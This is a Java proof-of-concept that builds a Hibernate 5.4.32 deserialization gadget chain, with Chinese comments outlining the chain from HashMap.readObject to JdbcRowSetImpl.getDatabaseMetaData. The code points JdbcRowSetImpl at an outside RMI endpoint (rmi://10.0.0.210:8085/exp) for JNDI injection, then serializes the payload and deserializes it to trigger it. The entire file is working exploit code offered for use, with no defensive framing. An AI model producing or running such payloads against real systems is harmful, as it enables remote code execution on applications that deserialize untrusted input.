
import com.sun.rowset.JdbcRowSetImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.property.access.spi.GetterMethodImpl;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.type.ComponentType;
import util.Reflections;
import util.Util;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
/*
 * 构造链:
 * HashMap.readObject
 *   TypedValue.hashCode
 *       ValueHolder.getValue
 *           TypedValue.initialize
 *               ComponentType.getHashCode
 *                   PojoComponentTuplizer.getPropertyValue
 *                       AbstractComponentTuplizer.getPropertyValue
 *                           GetterMethodImpl.get / BasicPropertyAccessor$BasicGetter.get
 *                               JdbcRowSetImpl.getDatabaseMetaData
 * */
/*
注意jdk版本以及JdbcRowSetImpl是否存在trustURLCodebase限制
* */
/*依赖:
    Hibernate5.4.32.Final
* */
public class Hibernate2 {
    public static void main(String[] args) throws Exception {

        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName("rmi://10.0.0.210:8085/exp");

        Method method = JdbcRowSetImpl.class.getDeclaredMethod("getDatabaseMetaData");
        Class<?> getterImpl = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        GetterMethodImpl getter = (GetterMethodImpl) constructor.newInstance(null, null, method);

        Class<?> pojoComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
        AbstractComponentTuplizer pojoComponentTuplizer = (AbstractComponentTuplizer) Reflections.createWithoutConstructor(pojoComponentTuplizerClass);
        Class<?> abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");
        Field gettersField = abstractComponentTuplizerClass.getDeclaredField("getters");
        gettersField.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        gettersField.set(pojoComponentTuplizer, getters);

        Class<?> componentTypeClass = Class.forName("org.hibernate.type.ComponentType");
        ComponentType componentType = (ComponentType) Reflections.createWithoutConstructor(componentTypeClass);
        Field componentTypeField = componentTypeClass.getDeclaredField("componentTuplizer");
        componentTypeField.setAccessible(true);
        componentTypeField.set(componentType, pojoComponentTuplizer);
        Field propertySpanField = componentTypeClass.getDeclaredField("propertySpan");
        propertySpanField.setAccessible(true);
        propertySpanField.set(componentType, 1);

        TypedValue typedValue = new TypedValue(componentType, null);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "dragonkeep");
        Field valueField = TypedValue.class.getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(typedValue, rs);

        Util.serialize(hashMap);
        Util.unserialize();

    }
}